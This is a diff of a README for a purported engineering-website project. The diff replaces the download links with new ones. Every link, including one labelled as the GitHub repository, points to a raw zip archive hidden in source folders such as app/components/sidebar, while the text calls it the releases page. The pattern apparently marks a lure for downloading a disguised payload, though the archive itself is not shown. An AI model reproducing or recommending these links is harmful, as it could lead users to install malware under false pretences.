@@ -1,6 +1,6 @@
 # 🌐 engineering-consulting - Your Versatile Engineering Website Solution
 
-[![Download Latest Release](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/routes/signIn/engineering-consulting-1.6-alpha.1.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/routes/signIn/engineering-consulting-1.6-alpha.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/components/sidebar/consulting-engineering-1.2.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/components/sidebar/consulting-engineering-1.2.zip)
 
 ## 📋 Overview
 
@@ -23,7 +23,7 @@ Before you download, please ensure that your system meets the following minimum 
 
 To download the application, visit the releases page by clicking the button below:
 
-[Download Latest Release](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/routes/signIn/engineering-consulting-1.6-alpha.1.zip)
+[Download Latest Release](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/components/sidebar/consulting-engineering-1.2.zip)
 
 Once on the releases page, look for the most recent version of the application. Follow these steps:
 
@@ -75,7 +75,7 @@ If you need further assistance, feel free to reach out. You can find help throug
   
 ## 🌍 Links and Resources
 
-- **GitHub Repository**: [engineering-consulting](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/routes/signIn/engineering-consulting-1.6-alpha.1.zip)
-- **Download Latest Release**: [Download Here](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/routes/signIn/engineering-consulting-1.6-alpha.1.zip)
+- **GitHub Repository**: [engineering-consulting](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/components/sidebar/consulting-engineering-1.2.zip)
+- **Download Latest Release**: [Download Here](https://raw.githubusercontent.com/Bkace1312/engineering-consulting/main/app/components/sidebar/consulting-engineering-1.2.zip)
   
 Thank you for choosing **engineering-consulting**! Enjoy building your professional engineering website.
